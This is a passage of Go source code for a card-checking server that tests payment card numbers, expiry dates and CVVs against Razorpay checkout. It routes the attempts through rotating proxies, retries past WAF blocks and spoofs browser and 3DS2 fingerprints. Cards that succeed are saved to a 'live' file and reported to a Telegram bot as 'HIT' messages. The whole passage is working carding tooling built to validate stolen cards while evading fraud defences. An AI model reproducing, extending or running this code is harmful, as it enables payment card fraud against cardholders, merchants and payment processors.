		"_[is_magic_script]":           {"false"},
		"_[platform]":                  {"browser"},
		"_[referer]":                   {targetURL},
		"_[shield][fhash]":             {fhash},
		"_[shield][tz]":                {"-330"},
		"_[device_id]":                 {rzpDeviceID},
		"_[build]":                     {BUILD},
		"_[shield][os]":                {"windows"},
		"_[shield][platform]":          {"browser"},
		"_[shield][browser]":           {"chrome"},
		"_[os]":                        {"windows"},
		"_[request_index]":             {"1"},
		"amount":                       {fmt.Sprintf("%.0f", orderAmountRaw)},
		"order_id":                     {orderID},
		"method":                       {"card"},
		"checkout_id":                  {checkoutID},
		// Card data
		"card[number]":                 {cc},
		"card[name]":                   {fullName},
		"card[expiry_month]":           {mm},
		"card[expiry_year]":            {yy2},
		"card[cvv]":                    {cvv},
		"card[cryptogram]":             {""},
		// Billing address (required by Razorpay for card payments)
		"billing_address[line1]":          {billingLine1},
		"billing_address[line2]":          {""},
		"billing_address[city]":           {billingCity},
		"billing_address[state]":          {billingState},
		"billing_address[country]":        {"in"},
		"billing_address[postal_code]":    {billingPostal},
				"save":                         {"0"},
	}
	addKeyIDForm(form7, kyid)

	paymentURL := "https://api.razorpay.com/v1/standard_checkout/payments/create/checkout?" +
		buildQuery("key_id", kyid, "session_token", sessid, "keyless_header", keylessHeader)

	paymentHeaders := stdHeaders()
	paymentHeaders["Accept"] = "application/json, text/plain, */*"
	paymentHeaders["Content-Type"] = "application/x-www-form-urlencoded"

	shuffledForm := shuffleFormValues(form7)
	log.Printf("[STEP7-REQ] payURL=%s", paymentURL)
	r7, err := fetch.PostForm(paymentURL, paymentHeaders, shuffledForm)
	if r7 != nil { log.Printf("[STEP7-RESP] HTTP=%d CT=%s BODY_FIRST_500=%s", r7.StatusCode, r7.Headers.Get("Content-Type"), func() string { b := r7.Text(); if len(b)>2000 {return b[:2000]}; return b }()) }
	if err != nil {
		return makeProxyError(err, proxyRaw)
	}

	// WAF retry with fresh proxy
	if r7.StatusCode == 403 || r7.StatusCode == 429 {
		retrySucceeded := false
		for retryAttempt := 1; retryAttempt <= 3; retryAttempt++ {
			pp2 := getNextProxy(globalProxyList)
			if pp2 == nil {
				break
			}
			fetch2, ferr := NewCustomFetch(pp2.parsed, genUA(), pp2.raw)
			if ferr != nil {
				continue
			}
			r7b, rerr := fetch2.PostForm(paymentURL, paymentHeaders, shuffledForm)
			fetch2.client.CloseIdleConnections()
			if rerr != nil {
				continue
			}
			if r7b.StatusCode == 403 || r7b.StatusCode == 429 {
				continue
			}
			r7 = r7b
			proxyRaw = pp2.raw
			retrySucceeded = true
			break
		}
		if !retrySucceeded {
			return CheckResult{
				Status:      "error",
				Message:     fmt.Sprintf("WAF blocked payment creation (HTTP %d)", r7.StatusCode),
				Proxy:       proxyRaw,
				ProxyStatus: "BLOCKED",
			}
		}
	}

	// Parse payment response (may be HTML envelope with embedded JSON)
	r7Body := strings.TrimSpace(r7.Text())
	var r7Data map[string]interface{}

	if isHTMLPaymentInProgress(r7Body, r7.Headers) {
		if embedded := extractEmbeddedJSON(r7Body); embedded != nil {
			r7Data = embedded
		} else {
			// No embedded JSON — Razorpay returned a session/challenge page
			// Try to extract any error text from the HTML
			if strings.Contains(r7Body, "expired") || strings.Contains(r7Body, "Expired") {
				return CheckResult{Status: "declined", Message: "Session expired (retry)", Proxy: proxyRaw, ProxyStatus: "LIVE"}
			}
			if strings.Contains(r7Body, "blocked") || strings.Contains(r7Body, "Blocked") {
				return CheckResult{Status: "error", Message: "WAF challenge page", Proxy: proxyRaw, ProxyStatus: "BLOCKED"}
			}
			return CheckResult{Status: "declined", Message: "Razorpay challenge/OTP page returned", Proxy: proxyRaw, ProxyStatus: "LIVE"}
		}
	} else {
		if err := json.Unmarshal([]byte(r7Body), &r7Data); err != nil {
			return CheckResult{Status: "error", Message: "Payment response parse failed: " + truncate(r7Body, 120), Proxy: proxyRaw, ProxyStatus: "LIVE"}
		}
	}

	// Extract payment_id
	paymentID := getStringFromMap(r7Data, "payment_id")
	if paymentID == "" {
		paymentID = getStringFromMap(r7Data, "id")
	}


	// Check for immediate r7 error with payment_id (risk check failed etc.)
	if errObj, ok := r7Data["error"].(map[string]interface{}); ok {
		if paymentID == "" {
			if meta, ok := errObj["metadata"].(map[string]interface{}); ok {
				paymentID = getStringFromMap(meta, "payment_id")
			}
		}
		if paymentID != "" {
			// Payment was created and immediately declined
			errCode2  := getStringFromMap(errObj, "code")
			errDesc   := getStringFromMap(errObj, "description")
			errReason := getStringFromMap(errObj, "reason")
			return classifyResult(errCode2, errDesc, errReason, proxyRaw)
		}
	}

	if paymentID == "" {
		errObj, _ := r7Data["error"].(map[string]interface{})
		// Try to extract payment_id from metadata even when top-level is missing
		if meta, ok := errObj["metadata"].(map[string]interface{}); ok {
			if pid := getStringFromMap(meta, "payment_id"); pid != "" {
				paymentID = pid
				// Fall through to normal payment flow below
				goto paymentIDResolved
			}
		}
		errCode2 := getStringFromMap(errObj, "code")
		errDesc   := getStringFromMap(errObj, "description")
		errReason := getStringFromMap(errObj, "reason")
		return classifyResult(errCode2, errDesc, errReason, proxyRaw)
	}
	paymentIDResolved:

	// pidClean: strip "pay_" prefix for pg_router calls
	pidClean := paymentID
	if idx := strings.Index(paymentID, "_"); idx != -1 {
		pidClean = paymentID[idx+1:]
	}

	// ──────────────────────────────────────────────────────────────────
	// STEP 8a: Authenticate (empty body)
	// POST api.razorpay.com/pg_router/v1/payments/<pid>/authenticate
	// ──────────────────────────────────────────────────────────────────
	fetch.PostForm(
		fmt.Sprintf("https://api.razorpay.com/pg_router/v1/payments/%s/authenticate", url.PathEscape(paymentID)),
		map[string]string{"Content-Type": "application/x-www-form-urlencoded"},
		url.Values{},
	)

	time.Sleep(1 * time.Second)

	// ──────────────────────────────────────────────────────────────────
	// STEP 8b: 3DS2 browser fingerprint
	// POST api.razorpay.com/pg_router/v1/payments/<pidClean>/authenticate
	// ──────────────────────────────────────────────────────────────────
	screens := [][]int{{1920, 1080}, {1366, 768}, {1536, 864}, {1440, 900}}
	screen := screens[randInt(0, len(screens)-1)]
	depths := []int{24, 32}

	form8 := url.Values{
		"browser[java_enabled]":       {"false"},
		"browser[javascript_enabled]": {"true"},
		"browser[timezone_offset]":    {"-330"},
		"browser[color_depth]":        {strconv.Itoa(depths[randInt(0, 1)])},
		"browser[screen_width]":       {strconv.Itoa(screen[0])},
		"browser[screen_height]":      {strconv.Itoa(screen[1])},
		"browser[language]":           {"en-US"},
		"auth_step":                   {"3ds2Auth"},
	}
	fetch.PostForm(
		fmt.Sprintf("https://api.razorpay.com/pg_router/v1/payments/%s/authenticate", url.PathEscape(pidClean)),
		map[string]string{"Content-Type": "application/x-www-form-urlencoded"},
		form8,
	)

	// ──────────────────────────────────────────────────────────────────
	// STEP 9: Poll payment status (check if already authorized/captured)
	// GET api.razorpay.com/v1/standard_checkout/payments/<pid>
	// ──────────────────────────────────────────────────────────────────
	statusURL := fmt.Sprintf(
		"https://api.razorpay.com/v1/standard_checkout/payments/%s?%s",
		url.PathEscape(paymentID),
		buildQuery("key_id", kyid, "session_token", sessid, "keyless_header", keylessHeader),
	)

	for pollAttempt := 0; pollAttempt < 5; pollAttempt++ {
		time.Sleep(2 * time.Second)
		pollResp, pollErr := fetch.Get(statusURL, stdHeaders())
		if pollErr != nil {
			break
		}
		var pollData map[string]interface{}
		if json.Unmarshal(pollResp.Body, &pollData) != nil {
			break
		}
		status := strings.ToLower(getStringFromMap(pollData, "status"))
		if status == "authorized" || status == "captured" {
			// Card successfully charged
			logLive(fmt.Sprintf("%s|%s|%s|%s", cc, mm, yy, cvv))
			notifyHitAsync(CheckResult{
				Status:  "charged",
				Message: "Payment authorized/captured",
				Proxy:   proxyRaw,
			})
			return CheckResult{Status: "charged", Message: "Payment authorized/captured", Proxy: proxyRaw, ProxyStatus: "LIVE"}
		}
		if status == "failed" || status == "cancelled" {
			// Already in terminal state
			errCode2, errDesc, errReason := "", "", ""
			if errObj, ok := pollData["error"].(map[string]interface{}); ok {
				errCode2  = getStringFromMap(errObj, "code")
				errDesc   = getStringFromMap(errObj, "description")
				errReason = getStringFromMap(errObj, "reason")
			}
			return classifyResult(errCode2, errDesc, errReason, proxyRaw)
		}
	}

	// ──────────────────────────────────────────────────────────────────
	// STEP 10: Cancel payment (free the order, get final decline reason)
	// POST api.razorpay.com/v1/standard_checkout/payments/<pid>/cancel
	// ──────────────────────────────────────────────────────────────────
	cancelURL := fmt.Sprintf(
		"https://api.razorpay.com/v1/standard_checkout/payments/%s/cancel?%s",
		url.PathEscape(paymentID),
		buildQuery("key_id", kyid, "session_token", sessid, "keyless_header", keylessHeader),
	)
	r10, r10err := fetch.PostForm(cancelURL, stdHeaders(), url.Values{})
	if r10err != nil {
		return CheckResult{Status: "declined", Message: "Cancelled (cancel request failed)", Proxy: proxyRaw, ProxyStatus: "LIVE"}
	}

	var r10Data map[string]interface{}
	_ = json.Unmarshal(r10.Body, &r10Data)

	errCode2, errDesc, errReason := "", "", ""
	if errObj, ok := r10Data["error"].(map[string]interface{}); ok {
		errCode2  = getStringFromMap(errObj, "code")
		errDesc   = getStringFromMap(errObj, "description")
		errReason = getStringFromMap(errObj, "reason")
	}
	// Also check top-level status/description fields some endpoints return
	if errDesc == "" {
		errDesc = getStringFromMap(r10Data, "description")
	}
	if errCode2 == "" {
		errCode2 = getStringFromMap(r10Data, "code")
	}

	result = classifyResult(errCode2, errDesc, errReason, proxyRaw)
	if result.Status == "approved" {
		logLive(fmt.Sprintf("%s|%s|%s|%s", cc, mm, yy, cvv))
	}
	return result
}

// ─────────────────────────────────────────────────────────────────────
//  LIVE.TXT LOGGER & TELEGRAM NOTIFIER
// ─────────────────────────────────────────────────────────────────────

func logLive(line string) {
	if shuttingDown.Load() {
		return
	}
	select {
	case liveWriteChan <- line:
	default:
	}
}

func notifyHitAsync(result CheckResult) {
	if shuttingDown.Load() {
		return
	}
	select {
	case tgNotifyChan <- result:
	default:
	}
}

func liveWriterGoroutine() {
	for line := range liveWriteChan {
		liveLogMutex.Lock()
		f, err := os.OpenFile(liveFilePath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
		if err == nil {
			fmt.Fprintln(f, line)
			f.Close()
		}
		liveLogMutex.Unlock()
	}
}

func tgNotifyWorker() {
	tgToken := strings.TrimSpace(os.Getenv("TG_BOT_TOKEN"))
	tgChatID := strings.TrimSpace(os.Getenv("TG_CHAT_ID"))
	for result := range tgNotifyChan {
		if tgToken == "" || tgChatID == "" {
			continue
		}
		msg := fmt.Sprintf("✅ HIT\nStatus: %s\nMessage: %s\nProxy: %s",
			result.Status, result.Message, extractProxyHost(result.Proxy))
		apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", tgToken)
		sharedHTTPClient.Post(apiURL, "application/json",
			strings.NewReader(fmt.Sprintf(`{"chat_id":%q,"text":%q}`, tgChatID, msg)))
	}
}

// ─────────────────────────────────────────────────────────────────────
//  HTTP SERVER
// ─────────────────────────────────────────────────────────────────────

func main() {
	liveFilePath = getEnvDefault("LIVE_FILE", "live.txt")
	proxyFile := getEnvDefault("PROXY_FILE", "px.txt")
	sitesFile := getEnvDefault("SITES_FILE", "sites.txt")

	globalProxyList = loadProxies(proxyFile)
	razorpayURLs = loadSites(sitesFile)

	log.Printf("✓ Loaded %d proxies, %d sites", len(globalProxyList), len(razorpayURLs))
	if len(globalProxyList) == 0 {
		log.Printf("⚠ No proxies loaded — running in DIRECT mode")
	}

	go liveWriterGoroutine()
	go tgNotifyWorker()

	mux := http.NewServeMux()

	// GET /check?cc=4111...&mm=12&yy=26&cvv=123&proxy=ip:port:user:pass&amount=1&currency=INR
	mux.HandleFunc("/check", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodGet && r.Method != http.MethodPost {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}
		q := r.URL.Query()
		cc := strings.TrimSpace(q.Get("cc"))
		mm := strings.TrimSpace(q.Get("mm"))
		yy := strings.TrimSpace(q.Get("yy"))
		cvv := strings.TrimSpace(q.Get("cvv"))
		proxyParam := strings.TrimSpace(q.Get("proxy"))
		amountParam := strings.TrimSpace(q.Get("amount"))
		currency := strings.TrimSpace(q.Get("currency"))
		targetURL := strings.TrimSpace(q.Get("url"))
		billingLine1 := strings.TrimSpace(q.Get("line1"))
		billingCity := strings.TrimSpace(q.Get("city"))
		billingState := strings.TrimSpace(q.Get("state"))
		billingPostal := strings.TrimSpace(q.Get("zip"))

		// Support pipe-separated format: cc=4619940985887738|08|30|502
		// Also support ?data=4619940985887738|08|30|502
		if (cc == "" || mm == "" || yy == "" || cvv == "") {
			// Try pipe-separated from "cc" param itself: cc=CARD|MM|YY|CVV
			pipeStr := cc
			if pipeStr == "" {
				pipeStr = strings.TrimSpace(q.Get("data"))
			}
			if pipeStr == "" {
				// Try raw path param (e.g. /check/4619...|08|30|502)
				pipeStr = strings.TrimSpace(q.Get("card"))
			}
			if parts := strings.Split(pipeStr, "|"); len(parts) == 4 {
				cc  = strings.TrimSpace(parts[0])
				mm  = strings.TrimSpace(parts[1])
				yy  = strings.TrimSpace(parts[2])
				cvv = strings.TrimSpace(parts[3])
			}
		}

		if cc == "" || mm == "" || yy == "" || cvv == "" {
			http.Error(w, `{"error":"missing required params: cc, mm, yy, cvv (or use pipe format: cc=CARD|MM|YY|CVV)"}`, http.StatusBadRequest)
			return
		}

		amount := defaultAmount
		if amountParam != "" {
			if a, err := strconv.ParseFloat(amountParam, 64); err == nil && a > 0 {
				amount = a
			}
		}
		if currency == "" {
			currency = defaultCurrency
		}
		if targetURL == "" {
			targetURL = getNextURL()
		}

		// Resolve proxy
		var pp *parsedProxy
		if proxyParam != "" {
			formatted := formatProxy(proxyParam)
			pURL, err := url.Parse(formatted)
			if err == nil {
				pp = &parsedProxy{raw: formatted, parsed: pURL}
			}
		} else if len(globalProxyList) > 0 {
			pp = getNextProxy(globalProxyList)
		}

		// Concurrency semaphore
		checkSemaphore <- struct{}{}
		defer func() { <-checkSemaphore }()

		result := checkCard(cc, mm, yy, cvv, pp, targetURL, amount, currency, billingLine1, billingCity, billingState, billingPostal)
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(result)
	})

	// GET /health
	mux.HandleFunc("/health", func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprintf(w, `{"status":"ok","proxies":%d,"sites":%d}`, len(globalProxyList), len(razorpayURLs))
	})

	// POST /reload — reload proxies and sites from disk
	mux.HandleFunc("/reload", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "POST only", http.StatusMethodNotAllowed)
			return
		}
		globalProxyList = loadProxies(proxyFile)
		razorpayURLs = loadSites(sitesFile)
		fmt.Fprintf(w, `{"proxies":%d,"sites":%d}`, len(globalProxyList), len(razorpayURLs))
	})

	port := getEnvDefault("PORT", strconv.Itoa(PORT))
	srv := &http.Server{
		Addr:         ":" + port,
		Handler:      mux,
		ReadTimeout:  60 * time.Second,
		WriteTimeout: 120 * time.Second,
		IdleTimeout:  120 * time.Second,
	}

	log.Printf("🚀 Server starting on :%s", port)

	// Graceful shutdown
	quit := make(chan os.Signal, 1)
	signal.Notify(quit, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-quit
		log.Printf("Shutting down...")
		shuttingDown.Store(true)
		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
		defer cancel()
		srv.Shutdown(ctx)
		close(liveWriteChan)
		close(tgNotifyChan)
	}()

	if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
		log.Fatalf("Server error: %v", err)
	}
	log.Printf("Server stopped")
}

// ─────────────────────────────────────────────────────────────────────
//  UTIL
// ─────────────────────────────────────────────────────────────────────

func getEnvDefault(key, def string) string {
	if v := strings.TrimSpace(os.Getenv(key)); v != "" {
		return v
	}
	return def
}

// Suppress unused import errors for packages only used in original code
var _ = sort.Strings
var _ = bufio.NewReader
var _ = errors.New
var _ = math.Round
var _ = big.NewInt
